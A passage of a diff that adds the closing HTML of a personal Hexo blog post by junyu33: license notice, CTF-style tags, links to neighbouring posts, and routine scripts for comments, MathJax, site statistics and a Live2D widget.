+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/python/" rel="tag"># python</a>
+              <a href="/tags/reverse/" rel="tag"># reverse</a>
+              <a href="/tags/crypto/" rel="tag"># crypto</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/misc/" rel="tag"># misc</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/c/" rel="tag"># c</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/17/clannad.html" rel="prev" title="Twenty-three——review of CLANNAD (anime)">
+                  <i class="fa fa-chevron-left"></i> Twenty-three——review of CLANNAD (anime)
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/12/11/security03.html" rel="next" title="安全项目第三题解答及思路分析">
+                  安全项目第三题解答及思路分析 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments"><div id="twikoo-comments"></div></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">丨junyu33丨</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">248k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:45</span>
+  </span>
+</div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+  
+
+
+
+
+
+  <script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              const target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    const script = document.createElement('script');
+    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js';
+    script.defer = true;
+    document.head.appendChild(script);
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.typesetClear();
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+
+<script>
+NexT.utils.loadComments('#twikoo-comments', () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js', () => {
+    twikoo.init(Object.assign({"enable":true,"visitor":true,"envId":"https://202182.vercel.app/"}, {
+      el: '#twikoo-comments'
+    }));
+  }, window.twikoo);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":250,"height":500},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
